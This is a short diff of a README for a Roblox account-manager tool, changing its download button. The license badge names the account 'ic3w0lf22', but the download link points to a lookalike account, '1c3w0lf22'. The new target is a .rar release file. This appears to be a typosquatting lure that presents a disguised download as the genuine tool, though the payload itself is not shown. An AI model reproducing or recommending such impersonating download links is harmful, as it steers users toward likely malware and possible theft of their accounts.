@@ -4,7 +4,7 @@
 ![License](https://img.shields.io/github/license/ic3w0lf22/Roblox-Account-Manager)
 
 <!-- BEGIN LATEST DOWNLOAD BUTTON -->
-[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/1c3w0lf22/Roblox-Account-Manager/releases/download/3.6.1/Roblox.Account.Manager.exe)
+[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/1c3w0lf22/Roblox-Account-Manager/releases/download/3.6.1/Roblox.Account.Manager.3.6.1.rar)
 <!-- END LATEST DOWNLOAD BUTTON -->
 
 [Click here to view Roblox Account Manager features](https://github.com/1c3w0lf22/Roblox-Account-Manager/blob/master/README.md#features)
